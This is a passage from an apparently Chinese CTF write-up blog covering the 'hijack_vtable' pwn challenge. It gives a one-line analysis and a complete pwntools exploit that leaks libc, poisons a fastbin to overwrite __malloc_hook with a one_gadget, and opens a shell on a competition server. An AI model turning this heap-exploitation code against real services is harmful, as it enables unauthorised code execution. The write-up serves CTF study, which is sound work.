class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span>(<span class="string">&#x27;环境有毛病&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<h2 id="hijack-vtable">hijack_vtable</h2>
<h3 id="分析-4">分析</h3>
<p>没啥好分析的，add、show、delete、edit都没限制，直接fastbin attack打malloc hook</p>
<h3 id="EXP-4">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#----------------function area start----------------#</span></span><br><span class="line">sla = <span class="keyword">lambda</span> ch,data:p.sendlineafter(ch,data)</span><br><span class="line">sda = <span class="keyword">lambda</span> ch,data:p.sendafter(ch,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data:p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data:p.sendline(data)</span><br><span class="line">addr32 = <span class="keyword">lambda</span>:u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">addr64 = <span class="keyword">lambda</span>:u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr_name,addr:log.success(<span class="string">&quot;&#123;&#125; --&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr_name,<span class="built_in">hex</span>(addr)))</span><br><span class="line">ru = <span class="keyword">lambda</span> con:p.recvuntil(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">bp=<span class="number">0</span></span>):</span><br><span class="line">    gdb.attach(p,bp)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#----------------function area end------------------#</span></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="string">&#x27;31986&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice:&#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,<span class="built_in">len</span>,con</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;length:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;content:&#x27;</span>,con)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = addr64() - <span class="number">0x39bb78</span></span><br><span class="line">lg(<span class="string">&#x27;libc base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x10</span>,p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span> + p64(libc_base + <span class="number">0xd5c07</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>国城杯</tag>
      </tags>
  </entry>
</search>
